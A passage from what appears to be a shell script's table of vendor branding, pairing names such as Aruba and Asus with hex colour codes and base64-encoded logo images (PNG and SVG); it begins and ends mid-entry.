QEYG4k7bxKl0/goUuEdAD5T5BZL2MyPGsKAlLr9ZwJ0rjhnAznoVaH3ATylMMSo7VsTM0VpI5iQUJAAPxR90t0HJ2s7OpaVjPNJXgFBUIBjy7AqpPelYKp0R+IrUTb/SPKOu8E4XJn/ILpedbK+vkZreNEOgBUe+MS+3XP7HDYgpRMuHqiBF4hzNh4J6pwBoFWZcWTcZHf6R4vSuU80EnyBgPMA7MpYUMIES4LfGDHeUyI1IAjpnvThsjR36B+rzhEgZJ7dYzQrzA9Ff4pHAotF6fQTi4ReIuC3qsrXmOc5KmoKc9aAmHbuuheMEeKcjcemcOMWYrpeYQgziCUbtnFMyCvMOA/AzoxNkkCVnR3W14efUDtEakAQ0jmppJ+ktVCdlouyeYbHYyLiZ6AuPUMSSE1DBg876XsvGpJXQd2Lw0PZrN+ekwakbIxvLO/exCrO2aiTzuZAg0oHDWCc3f3RVFHaGMSbg8t01icCyORpN65EKvUHOb5ZENIzqQR4HtK93FrD+yJunhnVT6xXM+BWNoNjPBSLNKwRpdURC7/wMcD3Kwxxbanb78otA1JVZdY1WgjAJM7Z2GjM06AyNwjT/UNG1w4XpY1BW3PD20z6fwFoz1hQxpgEa++Uuv1DpQYE4QAmlR8X3AbChHSXq4P+LOrmD8PctYeAUacwxBdIafeI0uopat90P4C/KSrebGJ94e4XGzliQGxbh18PsFOcs/HZkxtEZUdRZDIlHxeljUM83PAnHXwqgG8yFZOAYzXmt8SsCkIvx2WXdzLAtysourUtPHK1KJw/JFifC0DZcegEfXp0Tf12UVo9LS3LOkC4UlX5DKp0fFIwPScMSNmYSYcR41Zxznk04Ry4/iEAHyicXp7vGOP9sShtHNoioTDrfBpAmdyDdbTJlHqrpMI3QmpAEHpiPvzTCfQMVGQxZvoNUKeLyvmBw+W7kMBnqxvu8WI00vCyKJ05YuHgayC8qMyEMN/jqKg54JPSDtiA6JppIYBCdW1XnHPGaWpKEmkqc4OANZo/2O0pFrENZExXh1anKHUygPUZDDvKbMafHGO9R0gNCELXlE64eKDd5V9I4DlQlOcLpP9GlM4PBrs9xQw8qjDE1mQC14jSmWeP7tsUFV/IZv2Ac8UcUAdld/n8AE5XJyH/SpxzdoiG61dAbW6QYVbdeqcobSy+CTf8lZLa90DIZBKyQzlFb9lc/pFSA4Kwd1vgcPqraWfHWoCnKIyzwdaRkDxceYKFrQ8BGKasUQK3b1wTlHwxWWDjmuBXIL5DYYiJNrfXkxUDsue8/keUOuckXS3NKHuozg3ChOl2Z/V4Udpg5nRN/admmKoAtGQw7CEE/mOZ03ec1IAg7MZW7jnI5vRdbHf7PmTiEAEHq4zHhKcl/0eetB2X/3sAfq7QE6+JFq2fK0pnj9jA1tlQuJyemJ4oPt47OOMGpLPD+ggAuzjn/CUDuUE0kLYQ7ikWUdtYtIaXfMEmy/dAWJvBsGU68KajsuY7UgNCH4VsLv9Ih9N7icPle4EKrFEiPANGeQZiJ1MJLJQqMD7l5R4r7U4aTYpC6ODUZWhqSoraWaSpKcmkT4e6E2TLCqx0b29/uVcJZ0qd1d8H8DO1zvkrcc45QLQ50OBw+XwMnKkoxPE2fdu1ceABUdtYxFcu3uCoqDmVzfw6wBWZmX7Bwbr+ht1V/UM5GS93sVf6JnCKTxIlDri9FwEo1EBDeffXjXKAi5go45fCoBc3rgnIS8F86LsLLDcDUPk1eUGsuUGSVeZCXYcb/mR3e+vBVKuoY5hic1cH4+GGPyk3ICNHTizYStoCFufcZ9CYp6WIqqDosAEimmV3X/ji7iQ6gqEM6pr6WPHx3qoCM70KwgmZmt8StKayMb4zNqwOrpRayC2GuacMSOrbg0R0qKiRrjE+6yR1St0hNWF8SkfXHgWkblLYWKOdbJkpSufQe4yE6QaY9bMZGKygeI1Ye3rkyImjW1qWdfToF3saaUtxya0MHCPOue/wdXPoc0LvP7N1g/7M5qegztQKCtnyYWhTQus8HcB7GZyQDdY1vOZw14yTGsgtErxtJgAxH3k1g8HT34Qb/ipCGL8mNVPySQD91DUVumbz6sWbRercIbqmPsakNF3G0e3FQ27ssXPpkXOu9B9NzDeodM4dCb5VmksONuCirx6Eys1MwCl2l88nShuTTeHGLZTUTgfwRgbDDmLWfy8HGeQOdveFRxJwnSiRV7TreuoukcH4OJzeiwE6VdkUjtEUbQ4sFaVzj1h41AIAK9TN3/WZQ101xyoyIHWapuNpgApUOuctH4Y2SVPJQTKQGwTA7DKnxyZiG9SkrqnfbqbCcwC8lsGwxSDt9TK39xSpgezDbJ6tcowQMg8RXdfWvLRVlDA2w9zVpUx0v8Knv4NNdBlyYsWgsJc5vK6DpwFIKeopClLQe3SwQbcNiN25bgqgblOhOGcDTDDD9SsAelphiCE6WR8UpY1La3jRDltH59kA/juDYQt1plccTu9pUgPZw+72nU7AWaJEXvFGNBx4RmQwPkldexxAqcIQ97WtCvxNlM5d2iKhMJgWKQxx8u6vbGk0ILaxk8uIoHAPgDhno5CgjhuhMDcIgMkykTQ2a9c2dsaK1l8AIJDBsAOY8IrDVX221EDmGTlyYgEYcnJhns1XkqbURTIu58HLAZf3DBC8CkOsG1BklZMsjTCH0zpuBvC1stk86EH7uGpH2gwI6Yk5inbPi3M2GJvCjVuIcIPKGEz05Ijxnv6itoFpakrGjuycDGBx5oJSAUN70THG+2OpgMyypbjkWgCjRIk8mqcQX7Bx5dIvRQpjM8w9ZQCgzVPa8zIu/6xp8S5R2xhzOCbcrK4xoASd2qNpMSA2p28iGD8V5yz8nWg4GCLgtwpDjOzosMoxfkansTEViwQvJnAm34xbWaNf2l3e86QCMsOQ0bXDiXGLKJFP0BUbwqG3RAfjk+TtdQAfqTBEINocfEOUNg7xcHAJM5oUmhCvw+Xb73JcbX/OmTQods78C3HOBhye9NR0ANvVtV/MsI3xjhGlDQ9HI6ErGZidSRMC0C/tLq+cqpYBTObUQwAOEiXypne/IxYJSMbzPMDuqq4AcLXCEFt0ohtFaeONyyZdnw4goSwAMNdW7jmo1wYkwdvvAeNwtc459AdpC8Zjw+qlnynODWImooXweEyitvE7u3gkeA2YM3mUpwmg5+1Of63Irw6bu/okMCaJEvniPTArFgnUiRD5QJ0GaAsAWNT17LipLRz4WrQ24Bzug4a1YDyhMMShVFAwq1cGpNRZU0nAFeKchX2hOjcICCfYP7FOFaXzg1hz6HZmvimDIU0gftbm8l8k6iugqspMbJoHSSCaD+ggviEWDt4pUuQHDnfLFQCU5UhiYGWsedQiUdq4mLXC2wF8ri4CX1Pq9rt6ZkA8HpNG+kIA6t4+i3M2PpnIDcK4r6TCN0LEzg/izaEHgIy+eDAR+BmbyzdN1E8vti3DLwe4QpQwPO0gOj8WDj0sUuQHpc5Jw5j5DoUhktBSU4E6XdQ2Lq3hRTuYWOWhQiaN+VlUVZm7bUDsn1iuAeAS5yzsjwzkBikym/G4KJ0/xCKBh8C4HGqTWv4rRMAcm9t7paifHsqcHptGuEOUMDq0hkHuWDjwa9Eif9A003wAxcoCMB6Pr1raLEobn3g41EhMv1MYYrSjfdgV3TIgw9y1h4BplsKLSYlzzi/25AZR+TXrPLvbf64onUcmpDm4gIjUfj37TxPCNNvh8l4j6qejE7fcq/hodkF1t030QFH7NyfEI4EWkSN/sDv954Oh7ChyBr7kzs46UTp/0AlXAdilrs3Q3Y6KmsP3a0ASrM+FyhNNiMU55xmbwo1bAKWf8QDm+YPdnmJRO3+IhgNPE7MPQDJTJoRBj9rd/ttE/d5T6qypJKKLRQnD8oaeMn0nGg7c1NKyrEPkyB9KxvmKQKx0xQABV8XXNm4TtfOHeCTQAsaDCkMMYLM+r0sD4nB6JxFYWSZhBr7kXYlZUt35RywSCir+jDfUCutdonSemZDm0FKCfh7AmZsIMd/pcPvvF/V7N//QSJ+DbiaxFXIIxrsE/ZxYJHha2wdLPhJB8g9zJ90PYLjCEMtikeB/i9L5R9HWjfeCWGW/MNHm8l+wVwMy2O0pZqJHxDkLva5fTk6DwtwgzJhmH+M/UZTOMxMSaXiZNZwHhZ+Av92WeIaYkJ5jc3l/BuC7ooRh2A4gAJ0mxJqDJ0UjDS+LJPmJw10zDsQqT43cQUlNDvPIU1palnWAoXSfJIEfLz7eO/hbBsSsWx4GMEycs9BbducGwX0KQ2jQeAHcUyyidn4RXxX6nabRRAAZe0HBzDPsLv9Don73GOz2FBOTmDZjmI5lYK7ljs6yWCRYE1sdeE9kyWOqqszM+kKo/TJ5R3RN/acidv4Si4R+D0DlPL2swKL9YwwxA4DN5f8egS9R6Zw1PfULqd78p7Sj86E2a8GJIHaoimHTt/84DrwoaueZgV0VaLI5vWeC6GEtY0t8+BS7018baw4skRroGgsXzFL5XAu9IgnQ5wT+q054l1L0dsw0YCXCixIiTd/BtnXYT2j3Xrqwqu45SoWPidL5j5lMVyc5dTqAQkVj7qU2lz8QjwT+uPtsXuZRpJGyDSisY+WG1Us/k6rNf9aubewEcGbWL0TDu8T0gKri9dSuHVLb6SfeHHoHwAn5cj8pjdaRrt+rqo1n6j7Kyz3WGPF2DeqeKaGLMRTYDvAOYt4K1ramNLQjqa1rM/f7VMyGWvSUvsFkUdPuSU9PIt94ONQIoFFqSzhQWsNLvrA7/T8jDWPVeQIeBeCP/w8QRzcVtF+uvQAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxOS0wNC0yNFQyMToyNjozOCswMDowMOmdUYcAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTktMDQtMjRUMjE6MjY6MzgrMDA6MDCYwOk7AAAAAElFTkSuQmCC'
										["Aruba"]='#E2E2E2 #4C6FCB #5B5B5B data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+DQo8c3ZnIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWw6c3BhY2U9InByZXNlcnZlIiB2aWV3Qm94PSItNTg0MCAxMzk0LjYgMjAwIDk3LjQ5ODMxIiBoZWlnaHQ9IjEwMCUiIHdpZHRoPSIxMDAlIiB2ZXJzaW9uPSIxLjEiIHk9IjBweCIgeD0iMHB4IiB4bWxuczpjYz0iaHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbnMjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iPjxtZXRhZGF0YT48cmRmOlJERj48Y2M6V29yayByZGY6YWJvdXQ9IiI+PGRjOmZvcm1hdD5pbWFnZS9zdmcreG1sPC9kYzpmb3JtYXQ+PGRjOnR5cGUgcmRmOnJlc291cmNlPSJodHRwOi8vcHVybC5vcmcvZGMvZGNtaXR5cGUvU3RpbGxJbWFnZSIvPjxkYzp0aXRsZS8+PC9jYzpXb3JrPjwvcmRmOlJERj48L21ldGFkYXRhPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCgkuc3Qwe2ZpbGw6IzY0NjU2OTt9DQoJLnN0MXtmaWxsOiNGNTgzMUY7fQ0KPC9zdHlsZT4NCjxnIHRyYW5zZm9ybT0ibWF0cml4KDEuMzUyMjY1MSwwLDAsMS4zNTIyNjUxLDE2MjUuNTg1MiwtODU2LjI0NTI2KSI+DQoJPHBhdGggZmlsbD0iIzY0NjU2OSIgY2xhc3M9InN0MCIgZD0ibS01NDkwLjMsMTcxNi42YzAtMC44LTAuNi0xLjItMS40LTEuMi0wLjcsMC0xLjIsMC4yLTEuNywwLjV2LTFjMC40LTAuMywxLjEtMC41LDEuOS0wLjUsMS40LDAsMi4zLDAuOCwyLjMsMi4xdjQuMWgtMXYtMC41Yy0wLjIsMC4yLTAuOSwwLjYtMS42LDAuNi0xLjIsMC0yLjMtMC43LTIuMy0xLjksMC0xLjEsMS0xLjksMi4zLTEuOSwwLjYsMCwxLjMsMC4zLDEuNSwwLjV2LTAuOHptMCwxLjljLTAuMi0wLjUtMC44LTAuOC0xLjQtMC44LTAuNywwLTEuNCwwLjMtMS40LDEuMSwwLDAuNywwLjcsMS4xLDEuNCwxLjEsMC42LDAsMS4yLTAuMywxLjQtMC44di0wLjZ6bTEyLjktNi4zdjguNGgtMS4xdi0zLjhoLTQuN3YzLjhoLTEuMXYtOC40aDEuMXYzLjZoNC43di0zLjZoMS4xem0yLjUsNS41YzAsMS40LDAuOSwyLjEsMiwyLjEsMC43LDAsMS4yLTAuMiwxLjctMC42djAuOWMtMC41LDAuNC0xLjEsMC41LTEuOCwwLjUtMS43LDAtMi45LTEuMi0yLjktMy4xczEuMS0zLjIsMi43LTMuMiwyLjUsMS4yLDIuNSwzdjAuNGgtNC4yem0wLTAuOGgzLjFjMC0wLjktMC41LTEuNy0xLjUtMS43LTAuNywwLjEtMS40LDAuNi0xLjYsMS43em0xMC41LDIuMywxLjMtNC42aDFsLTEuOCw2LjFoLTFsLTEuMy00LjYtMS4zLDQuNmgtMWwtMS44LTYuMWgxbDEuMyw0LjYsMS4yLTQuNmgwLjlsMS41LDQuNnptNC41LDEuNGgtMXYtOC45aDF2OC45em0yLjQtMi45YzAsMS40LDAuOSwyLjEsMiwyLjEsMC43LDAsMS4yLTAuMiwxLjctMC42djAuOWMtMC41LDAuNC0xLjEsMC41LTEuOCwwLjUtMS43LDAtMi45LTEuMi0yLjktMy4xczEuMS0zLjIsMi43LTMuMiwyLjUsMS4yLDIuNSwzdjAuNGgtNC4yem0wLTAuOGgzLjFjMC0wLjktMC41LTEuNy0xLjUtMS43LTAuNywwLjEtMS40LDAuNi0xLjYsMS43em03LjEsMy43aC0xdi01LjJoLTEuM3YtMC45aDEuM3YtMS42aDF2MS42aDEuNHYwLjloLTEuNHY1LjJ6bTQuNiwwaC0xdi01LjJoLTEuM3YtMC45aDEuM3YtMS42aDF2MS42aDEuNHYwLjloLTEuNHY1LjJ6bTYuOS0zLjR2My40aC0xLjF2LTguNGgzLjFjMS43LDAsMi44LDAuOSwyLjgsMi41cy0xLjEsMi41LTIuOCwyLjVoLTJ6bTItNC4xaC0ydjMuMWgyYzEuMSwwLDEuNy0wLjYsMS43LTEuNiwwLjEtMC44LTAuNS0xLjUtMS43LTEuNXptNy4zLDMuNWMwLTAuOC0wLjYtMS4yLTEuNC0xLjItMC43LDAtMS4yLDAuMi0xLjcsMC41di0xYzAuNC0wLjMsMS4xLTAuNSwxLjktMC41LDEuNCwwLDIuMywwLjgsMi4zLDIuMXY0LjFoLTF2LTAuNWMtMC4yLDAuMi0wLjksMC42LTEuNiwwLjYtMS4yLDAtMi4zLTAuNy0yLjMtMS45LDAtMS4xLDEtMS45LDIuMy0xLjksMC42LDAsMS4zLDAuMywxLjUsMC41di0wLjh6bTAsMS45Yy0wLjItMC41LTAuOC0wLjgtMS40LTAuOC0wLjcsMC0xLjQsMC4zLTEuNCwxLjEsMCwwLjcsMC43LDEuMSwxLjQsMS4xLDAuNiwwLDEuMi0wLjMsMS40LTAuOHYtMC42em01LjItNC4xYzAuNiwwLDEuMiwwLjEsMS42LDAuNXYxYy0wLjQtMC40LTEtMC42LTEuNi0wLjYtMS4xLDAtMiwwLjgtMiwyLjJzMC45LDIuMiwyLDIuMmMwLjYsMCwxLjEtMC4yLDEuNi0wLjZ2MWMtMC40LDAuNC0xLDAuNS0xLjYsMC41LTEuNiwwLTIuOS0xLjItMi45LTMuMiwwLTEuOCwxLjMtMywyLjktM3ptOC4xLDYuMmgtMS4zbC0yLjgtM3YzaC0xdi04LjloMXY1LjRsMi43LTIuNmgxLjNsLTMsMi44LDMuMSwzLjN6bTQuMy00YzAtMC44LTAuNi0xLjItMS40LTEuMi0wLjcsMC0xLjIsMC4yLTEuNywwLjV2LTFjMC40LTAuMywxLjEtMC41LDEuOS0wLjUsMS40LDAsMi4zLDAuOCwyLjMsMi4xdjQuMWgtMXYtMC41Yy0wLjIsMC4yLTAuOSwwLjYtMS42LDAuNi0xLjIsMC0yLjMtMC43LTIuMy0xLjksMC0xLjEsMS0xLjksMi4zLTEuOSwwLjYsMCwxLjMsMC4zLDEuNSwwLjV2LTAuOHptMCwxLjljLTAuMi0wLjUtMC44LTAuOC0xLjQtMC44LTAuNywwLTEuNCwwLjMtMS40LDEuMSwwLDAuNywwLjcsMS4xLDEuNCwxLjEsMC42LDAsMS4yLTAuMywxLjQtMC44di0wLjZ6bTUuNy0zYy0wLjItMC4xLTAuNC0wLjItMC43LTAuMi0wLjYsMC0xLjIsMC40LTEuNCwxLjF2NC4xaC0xdi02LjFoMXYwLjhjMC4zLTAuNSwwLjgtMC45LDEuNS0wLjksMC4zLDAsMC41LDAsMC42LDAuMXYxLjF6bTUuMiw0LjRjLTAuMywwLjQtMSwwLjgtMS43LDAuOC0xLjgsMC0yLjctMS40LTIuNy0zLjIsMC0xLjcsMS0zLjIsMi43LTMuMiwwLjgsMCwxLjQsMC40LDEuNywwLjh2LTMuNWgxdjguOWgtMXYtMC42em0wLTMuNmMtMC4zLTAuNi0wLjktMS0xLjYtMS0xLjIsMC0xLjgsMC45LTEuOCwyLjJzMC43LDIuMiwxLjgsMi4yYzAuNiwwLDEuMi0wLjQsMS42LTF2LTIuNHptLTkxLjIsOS42djFoLTQuM3YyLjdoMy45djFoLTMuOXYyLjloNC4zdjFoLTUuM3YtOC40bDUuMy0wLjJ6bTEuMywyLjNoMXYwLjhjMC40LTAuNSwxLTAuOSwxLjgtMC45LDEuNCwwLDIuMSwwLjksMi4xLDIuMnY0aC0xdi0zLjhjMC0wLjgtMC40LTEuNC0xLjMtMS40LTAuNywwLTEuMywwLjUtMS41LDEuMXY0LjFoLTF2LTYuMWgtMC4xem04LjMsNmgtMXYtNS4yaC0xLjN2LTAuOWgxLjN2LTEuNmgxdjEuNmgxLjR2MC45aC0xLjR2NS4yem0zLTIuOGMwLDEuNCwwLjksMi4xLDIsMi4xLDAuNywwLDEuMi0wLjIsMS43LTAuNnYwLjljLTAuNSwwLjQtMS4xLDAuNS0xLjgsMC41LTEuNywwLTIuOS0xLjItMi45LTMuMXMxLjEtMy4yLDIuNy0zLjIsMi41LDEuMiwyLjUsM3YwLjRoLTQuMnptMC4xLTAuOGgzLjFjMC0wLjktMC41LTEuNy0xLjUtMS43LTAuOCwwLTEuNCwwLjYtMS42LDEuN3ptOC42LTEuNGMtMC4yLTAuMS0wLjQtMC4yLTAuNy0wLjItMC42LDAtMS4yLDAuNC0xLjQsMS4xdjQuMWgtMXYtNi4xaDF2MC44YzAuMy0wLjUsMC44LTAuOSwxLjUtMC45LDAuMywwLDAuNSwwLDAuNiwwLjF2MS4xem0yLjEsNy40aC0xdi04LjRoMXYwLjdjMC4zLTAuNCwxLTAuOCwxLjctMC44LDEuOCwwLDIuNywxLjUsMi43LDMuMnMtMC45LDMuMi0yLjcsMy4yYy0wLjgsMC0xLjQtMC40LTEuNy0wLjh2Mi45em0wLTQuMmMwLjMsMC42LDAuOSwxLDEuNiwxLDEuMiwwLDEuOC0wLjksMS44LTIuMnMtMC43LTIuMi0xLjgtMi4yYy0wLjYsMC0xLjIsMC40LTEuNiwxdjIuNHptOC45LTMuMmMtMC4yLTAuMS0wLjQtMC4yLTAuNy0wLjItMC42LDAtMS4yLDAuNC0xLjQsMS4xdjQuMWgtMXYtNi4xaDF2MC44YzAuMy0wLjUsMC44LTAuOSwxLjUtMC45LDAuMywwLDAuNSwwLDAuNiwwLjF2MS4xem0xLjctMi4yYy0wLjQsMC0wLjctMC4zLTAuNy0wLjdzMC4zLTAuNywwLjctMC43LDAuNywwLjMsMC43LDAuN2MtMC4xLDAuNC0wLjQsMC43LTAuNywwLjd6bTAuNSw3LjJoLTF2LTYuMWgxdjYuMXptMS40LTEuNWMwLjYsMC41LDEuMywwLjgsMiwwLjhzMS4zLTAuMiwxLjMtMC44YzAtMC41LTAuMy0wLjctMC45LTAuOWwtMC44LTAuM2MtMC45LTAuMy0xLjUtMC43LTEuNS0xLjcsMC0xLjEsMC45LTEuNywyLjEtMS43LDAuNywwLDEuMywwLjIsMS44LDAuNXYxLjFjLTAuNS0wLjQtMS4xLTAuNy0xLjgtMC43LTAuNiwwLTEuMSwwLjMtMS4xLDAuOHMwLjMsMC43LDAuOSwwLjlsMC45LDAuM2MwLjksMC4zLDEuNCwwLjgsMS40LDEuNywwLDEuMS0xLDEuOC0yLjMsMS44LTAuOCwwLTEuNS0wLjItMi0wLjZ2LTEuMnptNi4zLTEuM2MwLDEuNCwwLjksMi4xLDIsMi4xLDAuNywwLDEuMi0wLjIsMS43LTAuNnYwLjljLTAuNSwwLjQtMS4xLDAuNS0xLjgsMC41LTEuNywwLTIuOS0xLjItMi45LTMuMXMxLjEtMy4yLDIuNy0zLjIsMi41LDEuMiwyLjUsM3YwLjRoLTQuMnptMC0wLjhoMy4xYzAtMC45LTAuNS0xLjctMS41LTEuNy0wLjcsMC0xLjQsMC42LTEuNiwxLjd6bTExLjItMi41YzAuNiwwLDEuMiwwLjEsMS42LDAuNXYxYy0wLjQtMC40LTEtMC42LTEuNi0wLjYtMS4xLDAtMiwwLjgtMiwyLjJzMC45LDIuMiwyLDIuMmMwLjYsMCwxLjEtMC4yLDEuNi0wLjZ2MWMtMC40LDAuNC0xLDAuNS0xLjYsMC41LTEuNiwwLTIuOS0xLjItMi45LTMuMiwwLTEuOCwxLjMtMywyLjktM3ptNS4zLDYuM2MtMS43LDAtMi44LTEuMy0yLjgtMy4yczEuMS0zLjIsMi44LTMuMiwyLjgsMS4zLDIuOCwzLjItMS4yLDMuMi0yLjgsMy4yem0wLTUuNGMtMS4xLDAtMS43LDAuOS0xLjcsMi4zLDAsMS4zLDAuNywyLjMsMS43LDIuMywxLjEsMCwxLjctMC45LDEuNy0yLjNzLTAuNi0yLjMtMS43LTIuM3ptMTAuMy0wLjljMS4yLDAsMS45LDAuOSwxLjksMi4ydjRoLTF2LTMuOWMwLTAuOC0wLjQtMS40LTEuMS0xLjQtMC42LDAtMS4xLDAuNC0xLjMsMS4xdjQuMmgtMXYtMy45YzAtMC44LTAuNC0xLjQtMS4xLTEuNC0wLjYsMC0xLjEsMC40LTEuMywxLjF2NC4yaC0xdi02LjFoMXYwLjdjMC4zLTAuNSwwLjktMC44LDEuNi0wLjgsMC44LDAsMS40LDAuNCwxLjYsMSwwLjItMC42LDAuOC0xLDEuNy0xem00LjYsOC41aC0xdi04LjRoMXYwLjdjMC4zLTAuNCwxLTAuOCwxLjctMC44LDEuOCwwLDIuNywxLjUsMi43LDMuMnMtMC45LDMuMi0yLjcsMy4yYy0wLjgsMC0xLjQtMC40LTEuNy0wLjh2Mi45em0wLTQuMmMwLjMsMC42LDAuOSwxLDEuNiwxLDEuMiwwLDEuOC0wLjksMS44LTIuMnMtMC43LTIuMi0xLjgtMi4yYy0wLjYsMC0xLjIsMC40LTEuNiwxdjIuNHptOS4yLTIuMmMwLTAuOC0wLjYtMS4yLTEuNC0xLjItMC43LDAtMS4yLDAuMi0xLjcsMC41di0xYzAuNC0wLjMsMS4xLTAuNSwxLjktMC41LDEuNCwwLDIuMywwLjgsMi4zLDIuMXY0LjFoLTF2LTAuNWMtMC4yLDAuMi0wLjksMC42LTEuNiwwLjYtMS4yLDAtMi4zLTAuNy0yLjMtMS45LDAtMS4xLDEtMS45LDIuMy0xLjksMC42LDAsMS4zLDAuMywxLjUsMC41di0wLjh6bTAsMS45Yy0wLjItMC41LTAuOC0wLjgtMS40LTAuOC0wLjcsMC0xLjQsMC4zLTEuNCwxLjEsMCwwLjcsMC43LDEuMSwxLjQsMS4xLDAuNiwwLDEuMi0wLjMsMS40LTAuOHYtMC42em0yLjctMy45aDF2MC44YzAuNC0wLjUsMS0wLjksMS44LTAuOSwxLjQsMCwyLjEsMC45LDIuMSwyLjJ2NGgtMXYtMy44YzAtMC44LTAuNC0xLjQtMS4zLTEuNC0wLjcsMC0xLjMsMC41LTEuNSwxLjF2NC4xaC0xdi02LjFoLTAuMXptNy4yLDguNCwwLjktMi4zLTIuNC02LjFoMS4xbDEuOCw0LjgsMS44LTQuOGgxLjFsLTMuMyw4LjRoLTF6Ii8+DQoJPHBhdGggZmlsbD0iI2Y1ODMxZiIgY2xhc3M9InN0MSIgZD0ibS01NDM2LjksMTY4Ny40LDAsMGMwLDgtNi40LDE0LjUtMTQuMiwxNC41cy0xNC4yLTYuNS0xNC4yLTE0LjV2LTEyLjNzNi44LDEuNyw2LjgsOC45djMuNGMwLDQuNCwzLjMsNy45LDcuNCw3LjlzNy40LTMuNSw3LjQtNy45di03LjEsMC4xYzAuMy02LDUuNC03LjksNi43LTguNmgwLjF2OC40LDcuMnptLTM2LjUtMTQuNGMxLjksMCwzLjcsMC4zLDUuMywxdjcuNmMtMS40LTEuMi0zLjMtMS45LTUuMy0xLjktNC41LDAtOC4xLDMuNS04LjEsNy45djE0LjNoLTYuOHYtMjYuMnMyLjgsMC4xLDQuNiwxLjRjMi42LTIuNiw2LjMtNC4xLDEwLjMtNC4xbS0zMi42LDIyLjRjLTQuNSwwLTguMi0zLjYtOC4yLThzMy43LTgsOC4yLTgsOC4yLDMuNiw4LjIsOC0zLjcsOC04LjIsOG0wLTIyLjRjLTguMiwwLTE0LjgsNi41LTE0LjgsMTQuNCwwLDgsNi42LDE0LjQsMTQuOCwxNC40LDMuNCwwLDYuNS0xLjEsOS0zLDEuNSwyLjUsNS44LDMsNS44LDN2LTE0LjRjMC03LjktNi42LTE0LjQtMTQuOC0xNC40bTExOC4zLDIyLjRjLTQuNSwwLTguMi0zLjYtOC4yLThzMy43LTgsOC4yLTgsOC4yLDMuNiw4LjIsOC0zLjcsOC04LjIsOG0wLTIyLjRjLTguMiwwLTE0LjgsNi41LTE0LjgsMTQuNCwwLDgsNi42LDE0LjQsMTQuOCwxNC40LDMuNCwwLDYuNS0xLjEsOS0zLDEuNSwyLjUsNS44LDMsNS44LDN2LTE0LjRjMC03LjktNi42LTE0LjQtMTQuOC0xNC40bS0zMS40LDIyLjRjLTQuNSwwLTguMi0zLjYtOC4yLThzMy43LTgsOC4yLTgsOC4yLDMuNiw4LjIsOGMwLjEsNC40LTMuNiw4LTguMiw4bTAtMjIuNGMtMywwLTUuOCwwLjktOC4yLDIuNHYtMi4zYy0wLjMtNi01LjItNy45LTYuNS04LjZoLTAuMXYzNy40czQuNC0wLjUsNi4xLTIuOWMyLjUsMS43LDUuNSwyLjgsOC43LDIuOCw4LjIsMCwxNC44LTYuNSwxNC44LTE0LjQsMC4xLTcuOS02LjYtMTQuNC0xNC44LTE0LjQiLz4NCjwvZz4NCjwvc3ZnPg0NCg=='
										["Asus"]='#283437 #279FD9 #C0C0C0 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgAAAABmCAYAAAC9SimUAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABmJLR0QA/wD/AP+gvaeTAAAdkElEQVR42u2deXycZbXHv+edpCttLU26QkUQvWorCrJcL15xQS5XrG0mUwTK1mYSClIQBAQVgmyKiFIQSGZC2UEmSUsvXi6rLHfxwqViAQFlp6S2TbMUaNIm85z7x0zSpEnbhCbzzjtzvp/P22bW953znPM8v/dZziMY2whX/QPIV0D2BfYM+K95nrroTcPyzacsG8Wm5CGg++OxN8o+oDNBxpsTZYBkwTdZcWpL9+N5NQfguWsyc3J5jrqyH+Vf3RC7Afh0Rs7lybEkypqG5bsj8T1xeliqjtOZwExgb2CkBZaPjBr9de5asCnTpy3Ie8NXVnq8OGMByg+B2Tnzu4TlwNAJgEj1F1CZi+MI3u88FGEUALrthEaGGL21d9yG3ESUb2bm5M7lpc2VgxEOyczJQiOGLm7vC6Et30LlX4AjcDoL8HoErpEV/rUptFufn3vTPniFMxE3FWEzImsZW/ASt57abgJgR5TEP85qvQfhH80D++GEO8fTtnkBIgtxHGTtvGEEhLk37UNB4SJc6ykge5lBcpDjqorY6p0NzEHYgNM3QNYB43G6N+93HkQ4/gwqv6V+0R9MAPQkHP8iqg8jFJkn9blrGEGy9XTa2n6MiNnHMILCnNgUCvkpUI5qoRkkJ7sLhNKac9mqCxG5js7QP/caEuziiMoCJk3/BiKXE4614HWWk1j8ngmASPyTOH0UCfw4/9AzL3YkrvVmhH3NGIYRECorPVbP+AFCJbCHGSRX265rR+Pit+K0mbGjDuaOkz7c4XufqOwEHgIeIhxbgCv8AyXVJ1Bf/mzXW7y8M+Apy0bhtA6s8e/jWOHYdXg8BNb4G0ZgKIl/nNUzHke4xhr/HBd5btw9qDxHfflpO238t6cueidOIojczbzYZ/JXAHzQcSnwefOmHsypmY4b9zSwBBvlN4zgUBo7AtFVCF81Y+Q4L0y/BFhDfdnVH+nzyxf9GWEhntYSqZoA+TYEUBI7DOVc86Sed/5Vs3Hu96SWAhmGERTC8ZNRrQZGmDFyvZ6OfQLHPCa5g7arvw/HhY7p+wHtRPU1QrqcREVr99O10acJV9fivPOAn+RPD0Dk2tEItwIh86YejX/Se9waf8MIWuNfHQVdZo1/nuC4BPRSqis6ej2f9A4FPR/0m70PjkNkGc77M3Nqpvf6zKgxvwIWELmlOH96ANz4y0E/bZ6UZl58Fk4fs1UQhhEwSuNlqN6MDdflB0cvHQn8E7MbFlK33WuCBzjqol/qRySeA/IrCpMXAmd2P3/Xgk2UxlaSTM7Jjx6ASM0/gp5tntTtGJ/D08eAYjOGYQSIktgiVKvIx/lb+cqYUUegPEFlZd8kXKI79gOv4I70m77Y5zXV3+Px7dx3ovKqQpyzgOmuQKqmIfIwMNmMYRhBit3qOQjVVpflGSqfQXi+39ect2Nf2NKdB6KtHwGwGuWzue9IG71zyaUUv7vD0UtHIl49ynQzhmEEiHmxzyDcYY1/HuLpNIS1/b62ox6AyC3FFLpfph+t6PN6aOJ6YHJuzw